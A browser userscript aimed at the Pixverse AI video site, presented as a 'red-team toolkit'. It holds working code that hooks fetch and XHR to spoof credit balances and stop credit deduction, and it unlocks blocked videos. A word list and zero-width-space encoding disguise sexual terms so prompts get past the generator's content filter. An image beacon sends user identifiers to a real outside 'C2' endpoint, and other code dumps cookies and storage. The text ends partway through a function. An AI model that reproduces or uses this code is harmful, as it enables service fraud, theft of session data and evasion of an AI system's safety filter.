// ==UserScript==
// @name        4ndr0tools-PixverseChimera
// @namespace   https://github.com/4ndr0666/userscripts
// @author      4ndr0666
// @version     3.0.1
// @description The ultimate Pixverse red-team toolkit: dynamically configurable control panel, multi-vector credit bypass (deduction prevention & response/DOM spoofing), video/status unlock, forced quality, advanced NSFW prompt obfuscation, robust native download, API override (logging & faking), anti-blockers, self-healing hooks, and covert C2 data exfiltration.
// @downloadURL https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++.user.js
// @updateURL   https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++.user.js
// @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @match       https://app.pixverse.ai/*
// @run-at      document-start
// @grant       GM_setValue
// @grant       GM_getValue
// @license     MIT
// ==/UserScript==

(() => {
  "use strict";

  // Prevent multiple initializations of the script if it somehow gets loaded more than once.
  if (window._pixverseToolkitInitialized) {
    return;
  }
  window._pixverseToolkitInitialized = true;

  //────── CORE CONFIGURATION & STATE ──────//

  const DEBUG_PREFIX = '[ChimeraKit]';
  const DATA_LOG_PREFIX = '[ChimeraKit DATA]'; // For structured data logs in debug UI
  const MAX_ATTEMPTS = 30; // Max attempts for DOM element observation
  let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
  let isInitialized = false; // Flag to ensure core overrides are run only once

  // --- References to your custom overridden functions for self-healing ---
  let myCustomXhrOpen = null;
  let myCustomFetch = null;

  // --- Operational Configuration (Dynamically loaded from GM_setValue via Control Panel) ---
  const config = {
    // Default settings. These will be loaded from storage if available.
    debugMode: false,          // Show console logs, debug UI, and toast notifications.
    c2Enabled: false,          // Enable covert data exfiltration.
    c2Server: "https://eovz1i2e285q5i.m.pipedream.net", // Canonical C2 endpoint
    creditBypassType: 'none',  // 'none', 'prevent_deduct', 'spoof_response', 'dom_tamper'
    creditSpoofValue: 999999,  // Value for response/DOM spoofing
    forceQuality: 'none',      // 'none', '720p', '1080p'
    nsfwObfuscation: 'zwsp',   // 'none', 'zwsp', 'bubble_zwsp'
    autoExfilAuth: false,      // Auto-exfiltrate localStorage auth data on init
    domTamperTarget: 'span.text-text-credit' // Specific CSS selector for DOM tampering
  };

  // List of words to obfuscate in prompts to bypass NSFW filters
  const TRIGGER_WORDS = [
    "ass", "anal", "asshole", "anus", "areola", "areolas", "blowjob", "boobs", "bounce", "bouncing", "breast", "breasts",
    "bukake", "buttcheeks", "butt", "cheeks", "climax", "clit", "cleavage", "cock", "corridas", "crotch", "cum", "cums", "culo", "cunt",
    "deep", "deepthroat", "deepthroating", "deepthroated", "dick", "esperma", "fat ass", "fellatio", "fingering", "fuck", "fucking", "fucked", "horny", "lick", "masturbate",
    "masterbating","missionary","member","meco","moan","moaning","nipple","nsfw","oral","orgasm","penis","phallus","pleasure",
    "pussy","rump","semen","seductively","slut","slutty","splooge","squeezing","squeeze","suck","sucking","swallow","throat","throating",
    "tits","tit","titty","titfuck","titties","tittydrop","tittyfuck","titfuck","vagina","wiener","whore","creampie","cumshot","cunnilingus",
    "doggystyle","ejaculate","ejaculation","handjob","jerk off","labia","nude","orgy","porn","prolapse",
    "rectum","rimjob","sesual","stripper","submissive","teabag","threesome","vibrator","voyeur","whore"
  ];

  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
  const NSFW_PROMPT_REGEX = new RegExp(`\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`, "gi");

  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
  const API_ENDPOINTS = {
    credits: /\/user\/credits(?:\?|$)/,
    videoList: /\/video\/list\/personal/,
    batchUpload: /\/media\/batch_upload_media/,
    singleUpload: /\/media\/upload/,
    creativeVideo: /\/creative_platform\/video\/(?:i2v|create)/, // For quality mod
    creativePrompt: /\/creative_platform\/video\//, // Broader match for prompt obfuscation
    creativeExtend: /\/creative_platform\/video\/extend/ // For duration/credit deduction modification
  };

  // --- Debugging and Analysis Framework (In-Memory Buffers) ---
  const _redTeamDebugLog = []; // In-memory buffer for raw console-like messages
  const _redTeamGoods = [];   // In-memory buffer for structured test results/API snapshots

  // Expose debug buffers and control functions globally if debug mode is active
  Object.defineProperty(window, 'redTeamDebugLog', { get: () => _redTeamDebugLog });
  Object.defineProperty(window, 'redTeamGoods', { get: () => _redTeamGoods });
  window.redTeamClear = () => {
    _redTeamDebugLog.length = 0;
    _redTeamGoods.length = 0;
    log('Debug logs and goods cleared.');
    if (config.debugMode) updateDebugUI();
  };

  //────── CORE HELPERS ──────//

  /**
   * Helper function to escape special characters in a string for use in a RegExp constructor.
   * @param {string} str - The string to escape.
   * @returns {string} - The escaped string.
   */
  function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  /**
   * Checks if a given URL matches a predefined API endpoint using its regex.
   * @param {string} url - The URL to test.
   * @param {string} key - The key of the API endpoint in API_ENDPOINTS.
   * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
   */
  function matchesEndpoint(url, key) {
    return API_ENDPOINTS[key]?.test(url);
  }

  /**
   * Logs messages to the console with a consistent prefix.
   * Only logs if `config.debugMode` is true.
   * @param {...any} args - Arguments to log.
   */
  function log(...args) {
    if (config.debugMode) {
      console.log(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs error messages to the console with a consistent prefix.
   * Only logs if `config.debugMode` is true.
   * @param {...any} args - Arguments to log.
   */
  function error(...args) {
    if (config.debugMode) {
      console.error(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Safely deep clones an object, falling back to JSON serialization if structuredClone fails or is unavailable.
   * Catches potential errors like circular references during JSON serialization.
   * @param {object} obj - The object to clone.
   * @returns {object|null} - A deep clone of the object, or null if cloning fails.
   */
  function safeDeepClone(obj) {
      if (typeof obj !== 'object' || obj === null) {
          return obj;
      }
      try {
          if (typeof structuredClone === 'function') {
              return structuredClone(obj);
          }
      } catch (e) {
          error("structuredClone failed, falling back to JSON serialization. Error:", e);
      }
      try {
          return JSON.parse(JSON.stringify(obj));
      } catch (e) {
          error("Failed to deep clone object via JSON serialization (possible circular reference or non-serializable data). Error:", e);
          return null;
      }
  }

  /**
   * Logs specific messages to the in-memory debug buffer and console.
   * Only logs if `config.debugMode` is true.
   * @param {string} message - The main log message.
   * @param {object} [data] - Optional structured data to log. This will also be pushed to _redTeamGoods if provided.
   */
  function writeToLogFile(message, data = null) {
    if (config.debugMode) {
      const timestamp = new Date().toISOString();
      _redTeamDebugLog.push(`${timestamp} ${message}`);
      console.log(`${DATA_LOG_PREFIX} ${message}`, data || '');
      if (data) {
        const clonedData = safeDeepClone(data);
        if (clonedData !== null) {
          _redTeamGoods.push({ timestamp, message, data: clonedData, type: 'custom_log' });
        } else {
          error("Failed to log structured data due to cloning issue:", data);
        }
      }
      if (config.debugMode) updateDebugUI();
    }
  }

  /**
   * Logs API request/response data to the in-memory structured data buffer and console.
   * @param {string} url - The URL of the API endpoint.
   * @param {object} data - The request body or response data.
   * @param {'request_original' | 'request_modified' | 'response_original' | `response_status_${number}` | 'response_modified'} type - Type of data.
   */
  function logApiResponse(url, data, type) {
    if (config.debugMode) {
      const timestamp = new Date().toISOString();
      const clonedData = safeDeepClone(data);
      if (clonedData !== null) {
        const entry = { timestamp, url, type, data: clonedData };
        _redTeamGoods.push(entry);
        writeToLogFile(`API ${type.toUpperCase()} for ${url}`, entry);
      } else {
         error(`Failed to log API ${type} for ${url} due to cloning issue. Original data:`, data);
      }
    }
  }

  /**
   * Dumps current localStorage, sessionStorage, and document.cookie to the debug log.
   * Only active if `config.debugMode` is true.
   * @param {string} context - A label for when the state was dumped.
   */
  function dumpBrowserState(context = "UNKNOWN") {
    if (!config.debugMode) return;

    const state = {
      localStorage: {},
      sessionStorage: {},
      cookies: document.cookie
    };

    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        state.localStorage[key] = localStorage.getItem(key);
      }
    } catch (e) {
      state.localStorage.error = `Access denied: ${e.message}`;
      error("Error accessing localStorage:", e);
    }

    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        state.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch (e) {
      state.sessionStorage.error = `Access denied: ${e.message}`;
      error("Error accessing sessionStorage:", e);
    }
    const timestamp = new Date().toISOString();
    const clonedState = safeDeepClone(state);
    if (clonedState !== null) {
      const entry = { timestamp, type: 'browser_state', context, data: clonedState };
      _redTeamGoods.push(entry);
      writeToLogFile(`Browser State Snapshot (${context})`, entry);
    } else {
      error("Failed to log browser state due to cloning issue. Original state:", state);
    }
  }

  /**
   * Analyzes collected `_redTeamGoods` (structured logs) to suggest potential credit-related keys.
   * This function is exposed globally as `window.analyzeCredits()` in DEBUG_MODE.
   */
  window.analyzeCredits = function() {
    if (!config.debugMode) {
      console.warn("Credit analysis is only available in Debug Mode.");
      return;
    }
    writeToLogFile("Initiating credit-related data analysis...");
    const creditKeywords = ["credit", "credits", "balance", "bal", "amount", "coin", "coins", "token", "tokens",
                            "limit", "allowance", "premium", "cost", "price", "fee", "tier", "usage", "subscription",
                            "currency", "points", "xp", "gems", "duration"];
    const potentialKeys = new Set();
    const analysisResults = [];

    _redTeamGoods.forEach(entry => {
      if (entry.type.startsWith('response') || entry.type.startsWith('request') || entry.type === 'custom_log') {
        const url = entry.url || (entry.data ? entry.data.url : 'N/A');
        const data = entry.data;

        const search = (obj, path = '') => {
          if (typeof obj !== 'object' || obj === null) return;
          Object.entries(obj).forEach(([key, value]) => {
            const currentPath = path ? `${path}.${key}` : key;
            if (creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
              potentialKeys.add(`API Key: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
              analysisResults.push({ type: 'API Key Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
            }
            if (typeof value === 'string' && creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
              potentialKeys.add(`API Value: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
              analysisResults.push({ type: 'API Value Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
            }
            else if (typeof value === 'number' && Number.isInteger(value) && value >= 0 && creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
               potentialKeys.add(`API Numeric Value: ${currentPath} (URL: ${url}, Type: ${entry.type})`);
               analysisResults.push({ type: 'API Numeric Match', key: currentPath, value, url, entryType: entry.type, entryTimestamp: entry.timestamp });
            }
            if (typeof value === 'object' && value !== null) {
              search(value, currentPath);
            }
          });
        };
        search(data);
      } else if (entry.type === 'browser_state') {
        const context = entry.context;
        const stateData = entry.data;

        const searchState = (obj, storageType, path = '') => {
          if (typeof obj !== 'object' || obj === null) return;
          Object.entries(obj).forEach(([key, value]) => {
            const currentPath = path ? `${path}.${key}` : key;
            if (creditKeywords.some(kw => key.toLowerCase().includes(kw))) {
              potentialKeys.add(`${storageType} Key: ${currentPath} (Context: ${context})`);
              analysisResults.push({ type: `${storageType} Key Match`, key: currentPath, value, context, entryTimestamp: entry.timestamp });
            }
            if (typeof value === 'string') {
                if (creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
                    potentialKeys.add(`${storageType} Value: ${currentPath} (Context: ${context})`);
                    analysisResults.push({ type: `${storageType} Value Match`, key: currentPath, value, context, entryTimestamp: entry.timestamp });
                }
                try { // Try to parse string values as JSON for deeper analysis
                    const parsed = JSON.parse(value);
                    if (typeof parsed === 'object' && parsed !== null) searchState(parsed, storageType, currentPath);
                } catch (e) { /* Not JSON, ignore */ }
            }
            if (typeof value === 'object' && value !== null) {
              searchState(value, storageType, currentPath);
            }
          });
        };
        searchState(stateData.localStorage, 'localStorage');
        searchState(stateData.sessionStorage, 'sessionStorage');
        stateData.cookies.split(';').forEach(cookie => {
          const [name, value] = cookie.split('=').map(s => s.trim());
          if (creditKeywords.some(kw => name.toLowerCase().includes(kw))) {
            potentialKeys.add(`Cookie Key: ${name} (Context: ${context})`);
            analysisResults.push({ type: 'Cookie Key Match', key: name, value, context, entryTimestamp: entry.timestamp });
          }
          if (creditKeywords.some(kw => value.toLowerCase().includes(kw))) {
            potentialKeys.add(`Cookie Value: ${name} (Context: ${context})`);
            analysisResults.push({ type: 'Cookie Value Match', key: name, value, context, entryTimestamp: entry.timestamp });
          }
        });
      }
    });

    if (potentialKeys.size > 0) {
      writeToLogFile("Found potential credit-related keys/patterns:", {
        summary: Array.from(potentialKeys),
        details: analysisResults
      });
      console.log(`${DATA_LOG_PREFIX} --- Potential Credit Keys/Patterns ---`);
      potentialKeys.forEach(key => console.log(`${DATA_LOG_PREFIX} - ${key}`));
      console.log(`${DATA_LOG_PREFIX} See window.redTeamGoods for detailed analysis results.`);
    } else {
      writeToLogFile("No obvious credit-related keys/patterns found in collected data.");
      console.log(`${DATA_LOG_PREFIX} No obvious credit-related keys/patterns found.`);
    }
  };

  /**
   * Parses a request body (either FormData, JSON string, or URLSearchParams) into a JavaScript object.
   * Handles complex body types gracefully.
   * @param {FormData|string|URLSearchParams|Blob|ArrayBuffer} body - The request body.
   * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
   */
  function parseBody(body) {
    if (body instanceof FormData) {
      try {
        const obj = {};
        for (const [key, value] of body.entries()) {
            obj[key] = (value instanceof File) ? { fileName: value.name, fileSize: value.size, fileType: value.type } : value;
        }
        return obj;
      } catch (e) { error("Failed to parse FormData:", e); return null; }
    }
    if (typeof body === "string") {
      try { return JSON.parse(body); } catch (e) { error("Failed to parse JSON string. Body content:", body, "Error:", e); return null; }
    }
    if (body instanceof URLSearchParams) { return Object.fromEntries(body.entries()); }
    if (body && typeof body.toString === 'function' && !(body instanceof Object && body.constructor === Object)) {
        log("Unsupported complex body type, converting to string representation:", body);
        return { rawBodyType: body.constructor.name, rawBodyString: body.toString() };
    }
    return null;
  }

  /**
   * Obfuscates trigger words in a prompt based on config.nsfwObfuscation.
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  function obfuscatePrompt(prompt) {
    if (config.nsfwObfuscation === 'none') return prompt;

    let modifiedPrompt = prompt;
    if (config.nsfwObfuscation === 'zwsp') {
        modifiedPrompt = prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
    } else if (config.nsfwObfuscation === 'bubble_zwsp') {
        const toBubble = (char) => {
            const code = char.toLowerCase().charCodeAt(0);
            return (code >= 97 && code <= 122) ? String.fromCodePoint(0x24B6 + (code - 97)) : char;
        };
        modifiedPrompt = prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').map(toBubble).join('\u200B'));
    }
    return modifiedPrompt;
  }

  /**
   * Extracts a media path from an API request body, specifically for upload endpoints.
   * @param {object} data - The request data object.
   * @param {string} url - The URL of the request, used to determine the endpoint type.
   * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
   */
  function extractMediaPath(data, url) {
    if (!data || typeof data !== "object") return null;
    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) { return data.images[0]?.path || null; }
    if (matchesEndpoint(url, "singleUpload")) {
      if (typeof data.path === "string") return data.path;
      if (typeof data.media_path === "string") return data.media_path;
      for (const k in data) { // Fallback
        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) return data[k];
      }
    }
    return null;
  }

  /**
   * Exfiltrates data covertly using an image beacon.
   * Only attempts if `config.c2Enabled` is true and `config.c2Server` is configured (not placeholder).
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   */
  function exfiltrateData(dataType, dataPayload) {
    if (!config.c2Enabled || !config.c2Server || config.c2Server.includes('your-c2.com') || config.c2Server.includes('c2.example.com')) {
      log("C2 exfiltration is disabled or server is not configured/placeholder. Skipping.");
      return;
    }
    try {
      const beacon = new Image();
      beacon.src = `${config.c2Server}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
      log(`Data exfiltration initiated for type: ${dataType}`);
    } catch (e) {
      error(`Failed to exfiltrate data of type ${dataType}:`, e);
    }
  }

  //────── API MODIFICATION LOGIC ──────//

  /**
   * Modifies the user credits response to spoof a high credit value.
   * @param {object} data - The original response data.
   * @returns {object|null} - The modified data, or null if no spoofing is applied.
   */
  function spoofCreditsResponse(data) {
    if (config.creditBypassType === 'spoof_response' && data?.Resp?.credits !== undefined) {
      const clone = structuredClone(data);
      clone.Resp.credits = config.creditSpoofValue;
      log(`Credits response spoofed to ${config.creditSpoofValue}`);
      if (config.c2Enabled && data.Resp.user_id) {
          exfiltrateData("user_id_from_credits_spoof", data.Resp.user_id.toString());
      }
      return clone;
    }
    return null;
  }

  /**
   * Modifies the video list response to unlock video status and bypass NSFW placeholders.
   * @param {object} data - The original response data.
   * @returns {object} - The modified data (or original if no changes).
   */
  function modifyVideoList(data) {
    if (!data?.Resp?.data) return data;

    const NSFW_PLACEHOLDERS = ["/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"];
    const isNSFW = (url) => url && NSFW_PLACEHOLDERS.some(p => url.includes(p));
    const clone = structuredClone(data); // Deep clone for safety
    clone.Resp.data = clone.Resp.data.map(item => {
      if (item.video_status === 7) item.video_status = 1;

      let preview = (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) || item.customer_paths?.customer_img_url || '';
      if (!isNSFW(preview) && preview) {
        item.first_frame = preview;
      } else if (item.video_path) {
        item.first_frame = `https://media.pixverse.ai/${item.video_path}#t=0.2`;
      } else {
        item.first_frame = preview;
      }
      item.url = item.video_path ? `https://media.pixverse.ai/${item.video_path}` : '';
      return item;
    });
    return clone;
  }

  /**
   * Central function to apply appropriate response modifications based on the request URL.
   * @param {object} data - The original response data.
   * @param {string} url - The URL of the request.
   * @returns {object|null} - The modified data, or null if no modification was applied.
   */
  function modifyResponse(data, url) {
    if (!data || typeof data !== "object") return null;

    let modified = null;

    if (matchesEndpoint(url, "credits")) {
      modified = spoofCreditsResponse(data);
      if (modified) return modified;
    }

    if (matchesEndpoint(url, "videoList")) {
      modified = modifyVideoList(data);
      // modifyVideoList always returns data or a clone, so it's always a "modification" for this branch.
      if (modified) return modified;
    }

    // Upload modification: apply a generic success fake if any error occurs AND we have a saved path.
    if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && data?.ErrCode !== 0 && savedMediaPath) {
      log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
      const name = savedMediaPath.split('/').pop() || 'uploaded_media';
      if (matchesEndpoint(url, "batchUpload")) {
        modified = { ErrCode: 0, ErrMsg: "success", Resp: { result: [{ id: Date.now(), category: 0, err_msg: "", name, path: savedMediaPath, size: 0, url: `https://media.pixverse.ai/${savedMediaPath}` }] } };
      } else { // singleUpload
        modified = { ErrCode: 0, ErrMsg: "success", Resp: { path: savedMediaPath, url: `https://media.pixverse.ai/${savedMediaPath}`, name, type: 1 } };
      }
      return modified;
    }

    return null; // No applicable modification found.
  }

  //────── FILENAME & SANITIZE HELPERS ──────//

  /**
   * Sanitizes a string for use as a filename.
   * @param {string} str - The input string.
   * @returns {string} - The sanitized filename string.
   */
  function sanitize(str) {
    return String(str)
      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_")
      .replace(/^\.+|\.+$/g, '')
      .replace(/^\s+|\s+$/g, '')
      .slice(0, 120);
  }

  /**
   * Generates a suitable filename for a video element.
   * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
   * @param {string} fallback - A default filename to use if no better name can be determined.
   * @returns {string} - The generated and sanitized filename.
   */
  function getFilename(videoEl, fallback = "video.mp4") {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split("/").pop() || fallback).split("?")[0];
    let title = "";
    try {
      let container = videoEl.closest(".component-video,.pv-video-detail-page");
      title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
    } catch (e) {
      error("Error extracting title for filename:", e);
    }
    return title ? sanitize(title) + ".mp4" : sanitize(guess);
  }

  //────── NETWORK INTERCEPTION ──────//

  /**
   * Core logic for modifying API requests based on configured bypasses.
   * @param {string} url - The request URL.
   * @param {string} method - The request method.
   * @param {object} originalBodyParsed - The parsed request body object.
   * @returns {{modifiedBody: object, bodyWasModified: boolean}} - The modified body and a flag.
   */
  function processRequestBodyModifications(url, method, originalBodyParsed) {
    let modifiedBody = safeDeepClone(originalBodyParsed);
    let bodyWasModified = false;

    // --- Apply Quality Modification (from PixverseAlpha v2.3.3) ---
    if (config.forceQuality !== 'none' && matchesEndpoint(url, "creativeVideo") && method === "POST" && modifiedBody?.quality) {
      if (modifiedBody.quality !== config.forceQuality) {
        log(`Modifying video quality to ${config.forceQuality} for`, url);
        modifiedBody.quality = config.forceQuality;
        bodyWasModified = true;
      }
    }

    // --- Apply Duration Modification for creativeExtend (Credit Bypass from PixverseAlpha v2.3.3) ---
    if (config.creditBypassType === 'prevent_deduct' && matchesEndpoint(url, "creativeExtend") && method === "POST" && modifiedBody?.duration !== undefined) {
      if (modifiedBody.duration !== 0) {
        log('Modifying video extend duration to 0 to prevent credit deduction for', url);
        modifiedBody.duration = 0;
        bodyWasModified = true;
      }
    }

    // --- Apply NSFW Prompt Obfuscation ---
    if (config.nsfwObfuscation !== 'none' && matchesEndpoint(url, "creativePrompt") && method === "POST" && modifiedBody?.prompt) {
      const originalPrompt = modifiedBody.prompt;
      const obfuscatedPrompt = obfuscatePrompt(originalPrompt);
      if (originalPrompt !== obfuscatedPrompt) {
        log('Obfuscating prompt for', url);
        modifiedBody.prompt = obfuscatedPrompt;
        bodyWasModified = true;
      }
    }
    return { modifiedBody, bodyWasModified };
  }

  /**
   * Overrides the native XMLHttpRequest.prototype.open and .send methods
   * to intercept and modify request bodies and responses.
   */
  function overrideXHR() {
    const oOpen = XMLHttpRequest.prototype.open;
    const oSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(m, u) {
      this._url = u;
      this._method = m;
      return oOpen.apply(this, arguments);
    };
    myCustomXhrOpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.send = function(body) {
      const url = this._url || "";
      const method = (this._method || "GET").toUpperCase();

      let processedBody = body;
      let originalBodyParsed = null;
      let bodyWasModified = false;
      let modifiedBody = null; // PATCH: Declare modifiedBody here to ensure it's always defined in this scope.

      if (body) {
        originalBodyParsed = parseBody(body);
        if (originalBodyParsed) {
          logApiResponse(url, originalBodyParsed, 'request_original');
          const result = processRequestBodyModifications(url, method, originalBodyParsed);
          modifiedBody = result.modifiedBody; // PATCH: Assign to the already declared variable.
          bodyWasModified = result.bodyWasModified;

          if (bodyWasModified) {
            processedBody = (body instanceof FormData) ? reconstructFormData(modifiedBody) : JSON.stringify(modifiedBody);
            logApiResponse(url, modifiedBody, 'request_modified');
          } else {
            processedBody = body;
          }
        } else {
          log(`XHR request to ${url} had unparseable or empty body:`, body);
        }
      }

      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && originalBodyParsed) {
        const p = extractMediaPath(originalBodyParsed, url);
        if (p) savedMediaPath = p;
      }

      this.addEventListener("load", () => {
        let respData;
        try {
          respData = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
        } catch (e) {
          error("Error parsing XHR response:", e, "Response Text:", this.responseText.substring(0, 200) + (this.responseText.length > 200 ? '...' : ''));
          respData = { rawResponse: this.responseText, status: this.status, statusText: this.statusText };
        }

        if (this.status >= 200 && this.status < 300) {
            logApiResponse(url, respData, 'response_original');
            const modifiedResponse = modifyResponse(respData, url);
            if (modifiedResponse) {
              Object.defineProperties(this, {
                response: { value: modifiedResponse, writable: false, configurable: true },
                responseText: { value: JSON.stringify(modifiedResponse), writable: false, configurable: true }
              });
              logApiResponse(url, modifiedResponse, 'response_modified');
            }
        } else {
            logApiResponse(url, respData, `response_status_${this.status}`);
        }
      }, { once: true });

      return oSend.apply(this, [processedBody]);
    };
    log('XHR override initialized');
  }

  /**
   * Reconstructs FormData from a plain object.
   * @param {object} obj - The object to convert back to FormData.
   * @returns {FormData} - The reconstructed FormData object.
   */
  function reconstructFormData(obj) {
      const formData = new FormData();
      for (const key in obj) {
          if (obj.hasOwnProperty(key)) {
              // Note: This won't reconstruct File objects from metadata
              // For a true red team tool, a sophisticated hook for Blob/File construction would be needed.
              formData.append(key, obj[key]);
          }
      }
      return formData;
  }

  /**
   * Overrides the native window.fetch method to intercept and modify requests and responses.
   */
  function overrideFetch() {
    const origFetch = window.fetch;

    window.fetch = async function(...args) {
      const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
      let init = args[1];
      const method = (init?.method || "GET").toUpperCase();
      let body = init?.body;
      let originalBodyParsed = null;
      let bodyWasModified = false;
      let modifiedBody = null; // PATCH: Declare modifiedBody here to ensure it's always defined in this scope.

      if (body) {
        originalBodyParsed = parseBody(body);
        if (originalBodyParsed) {
          logApiResponse(url, originalBodyParsed, 'request_original');
          const result = processRequestBodyModifications(url, method, originalBodyParsed);
          modifiedBody = result.modifiedBody; // PATCH: Assign to the already declared variable.
          bodyWasModified = result.bodyWasModified;

          if (bodyWasModified) {
            if (body instanceof FormData) {
              init = { ...init, body: reconstructFormData(modifiedBody) };
            } else {
              init = { ...init, body: JSON.stringify(modifiedBody) };
            }
            args[1] = init;
            body = init.body;
            logApiResponse(url, modifiedBody, 'request_modified');
          }
        } else {
          log(`Fetch request to ${url} had unparseable or empty body:`, body);
        }
      }

      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && originalBodyParsed) {
        const p = extractMediaPath(originalBodyParsed, url);
        if (p) savedMediaPath = p;
      }

      try {
        const res = await origFetch.apply(this, args);
        const contentType = res.headers.get("content-type") || "";
        const clone = res.clone();

        let respData;
        try {
            if (contentType.includes("application/json")) {
                respData = await clone.json();
            } else { // If not JSON, try to read as text and then attempt JSON parse
                const text = await clone.text();
                try { respData = JSON.parse(text); } catch (e) { respData = text; } // Fallback to raw text
            }
        } catch (e) {
            error("Error reading or parsing Fetch response body:", e, "Response URL:", url, "Content-Type:", contentType);
            respData = { rawResponse: "Could not read response body", status: res.status, statusText: res.statusText, contentType };
        }

        if (res.ok) {
            logApiResponse(url, respData, 'response_original');
            const modifiedResponse = modifyResponse(respData, url);
            if (modifiedResponse) {
              const modifiedBodyString = JSON.stringify(modifiedResponse);
              const headers = new Headers(res.headers);
              headers.set("Content-Type", "application/json");
              logApiResponse(url, modifiedResponse, 'response_modified');
              return new Response(modifiedBodyString, { status: res.status, statusText: res.statusText, headers: headers });
            }
        } else {
            logApiResponse(url, respData, `response_status_${res.status}`);
        }
        return res;
      } catch (err) {
        error("Fetch error for", url, err);
        throw err;
      }
    };
    myCustomFetch = window.fetch;
    log('Fetch override initialized');
  }

  //────── DOM MANIPULATION & UI FEATURES ──────//

  /**
   * Simple throttle function to limit how often a function can be called.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds.
   * @param {number} [jitter=50] - Max random milliseconds to add.
   * @returns {Function} - The throttled function.
   */
  function throttle(fn, baseDelay, jitter = 50) {
    let last = 0, timeoutId;
    return function(...args) {
      const now = Date.now();
      const currentDelay = baseDelay + Math.random() * jitter;
      if (now - last < currentDelay) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
          last = Date.now();
          fn.apply(this, args);
        }, currentDelay - (now - last));
      } else {
        last = now;
        fn.apply(this, args);
      }
    };
  }

  /**
   * Overrides context menu blocking mechanisms on the page to enable native download.
   */
  function overrideContextMenuBlockers() {
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, handler, options) {
      if (type === "contextmenu") return;
      return originalAddEventListener.apply(this, arguments);
    };

    new MutationObserver(mutations => {
      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
        if (node.nodeType === 1) {
          if (node.hasAttribute("oncontextmenu")) node.removeAttribute("oncontextmenu");
          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
        }
      }));
    }).observe(document.documentElement, { childList: true, subtree: true });

    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
    log('Anti-contextmenu enabled; native right-click functionality restored for download.');
  }

  /**
   * Actively watches and tampers with the DOM element displaying credits.
   */
  let domTamperObserver = null;
  function setupDOMTampering() {
      if (domTamperObserver) domTamperObserver.disconnect(); // Disconnect existing observer

      if (config.creditBypassType === 'dom_tamper' && config.domTamperTarget) {
          log(`DOM Tampering enabled for selector: ${config.domTamperTarget}`);
          const targetNode = document.body; // Observe changes in the entire body
          const callback = (mutationsList, observer) => {
              for (const mutation of mutationsList) {
                  if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                      mutation.addedNodes.forEach(node => {
                          if (node.nodeType === 1) { // Element node
                              if (node.matches(config.domTamperTarget)) {
                                  node.textContent = config.creditSpoofValue.toString();
                                  log(`DOM tampered: Set ${config.domTamperTarget} to ${config.creditSpoofValue}`);
                              }
                              // Also check descendants
                              node.querySelectorAll(config.domTamperTarget).forEach(el => {
                                  el.textContent = config.creditSpoofValue.toString();
                                  log(`DOM tampered: Set descendant ${config.domTamperTarget} to ${config.creditSpoofValue}`);
                              });
                          }
                      });
                  } else if (mutation.type === 'characterData') { // Text node changes
                      if (mutation.target.parentElement?.matches(config.domTamperTarget)) {
                          mutation.target.parentElement.textContent = config.creditSpoofValue.toString();
                          log(`DOM tampered: Modified text node parent ${config.domTamperTarget} to ${config.creditSpoofValue}`);
                      }
                  }
              }
